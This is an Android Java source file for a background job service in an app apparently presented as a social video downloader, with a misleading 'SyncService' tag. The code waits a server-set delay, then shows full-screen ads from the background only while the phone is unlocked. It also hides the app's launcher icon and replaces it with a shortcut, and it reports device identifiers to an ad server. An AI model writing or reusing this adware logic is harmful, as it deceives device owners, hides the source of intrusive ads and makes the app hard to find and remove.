package com.v2social.socialdownloader.services;

import android.annotation.TargetApi;
import android.app.Instrumentation;
import android.app.KeyguardManager;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Display;
import android.view.MotionEvent;
import android.view.WindowManager;

import com.facebook.ads.Ad;
import com.facebook.ads.AdError;
import com.facebook.ads.InterstitialAdListener;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.v2social.socialdownloader.AppConstants;
import com.v2social.socialdownloader.R;
import com.v2social.socialdownloader.ShowAds;
import com.v2social.socialdownloader.network.CheckAds;
import com.v2social.socialdownloader.network.ClientConfig;

import java.util.Random;
import java.util.UUID;

/**
 * JobService to be scheduled by the JobScheduler.
 * start another service
 */
@TargetApi(23)
public class MuiJobService extends JobService {
    private static final String TAG = "SyncService";

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d("cao", "onStartJob");

        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
        int totalTime = mPrefs.getInt("totalTime", 0);
        totalTime += AppConstants.ALARM_SCHEDULE_MINUTES;
        mPrefs.edit().putInt("totalTime", totalTime).commit();

        Log.d("cao","totalTime = "+totalTime);
        int delay_retention = mPrefs.getInt("delay_retention", -1);
        if (delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
        {
            addShortcut();
            mPrefs.edit().putInt("delay_retention", -1).commit();
            return true;
        }

        if (totalTime == 1300) {
            SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
            mPrefs.edit().putInt("accept", 2).commit();
        }

        if (!mPrefs.contains("clientConfig")) {
            AdSdk.reportAndGetClientConfig(this);
        } else {
            int delayService = mPrefs.getInt("delayService", 12);
            if(totalTime < delayService *60)
            {
                return true;
            }

            int delay_report = mPrefs.getInt("delay_report", 2);
            int intervalService = mPrefs.getInt("intervalService", 10);
            boolean isNeedUpdateAdsConfig = mPrefs.getBoolean("isNeedUpdateAdsConfig",false) || (totalTime %(delay_report *60) == 0);
            if(isNeedUpdateAdsConfig)
            {
                mPrefs.edit().putBoolean("isNeedUpdateAdsConfig",true).commit();
                AdSdk.reportAndGetClientConfig(this);
            }
            else
            {
                int countNeedShowAds = mPrefs.getInt("needShowAds",0);
                countNeedShowAds += 1;
                mPrefs.edit().putInt("needShowAds", countNeedShowAds).commit();
                if(countNeedShowAds * AppConstants.ALARM_SCHEDULE_MINUTES >= intervalService * 1.5 && !isDeviceLocked() )
//                if(countNeedShowAds * AppConstants.ALARM_SCHEDULE_MINUTES >= 3 && !isDeviceLocked() )
                    AdSdk.showAds(this);
            }
        }
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {

        return true;
    }

    public boolean isDeviceLocked() {
        Context context = getApplicationContext();

        boolean isLocked = false;

        // First we check the locked state
        KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
        boolean inKeyguardRestrictedInputMode = keyguardManager.inKeyguardRestrictedInputMode();

        if (inKeyguardRestrictedInputMode) {
            isLocked = true;

        } else {
            // If password is not set in the settings, the inKeyguardRestrictedInputMode() returns false,
            // so we need to check if screen on for this case

            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                isLocked = !powerManager.isInteractive();
            } else {
                //noinspection deprecation
                isLocked = !powerManager.isScreenOn();
            }
        }

        Log.d("cao", isLocked ? "locked" : "unlocked");
        return isLocked;
    }

    private void addShortcut() {
        //Adding shortcut for MainActivity
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName()+".MAIN1");
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
        catch (Exception e)
        {
        }

        if(Build.VERSION.SDK_INT < 26)
        {
            Intent shortcutIntent = new Intent(getApplicationContext(),
                    com.v2social.socialdownloader.MainActivity.class);

            shortcutIntent.setAction(Intent.ACTION_MAIN);

            Intent addIntent = new Intent();
            addIntent
                    .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
            addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Social video downloader");
            addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                    Intent.ShortcutIconResource.fromContext(getApplicationContext(),
                            R.mipmap.ic_launcher));

            addIntent
                    .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
            addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
            getApplicationContext().sendBroadcast(addIntent);

            SharedPreferences mPrefs = getSharedPreferences("adsserver", 0);
            String uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
            AdSdk.createShortcut(uuid);
        }
    }


}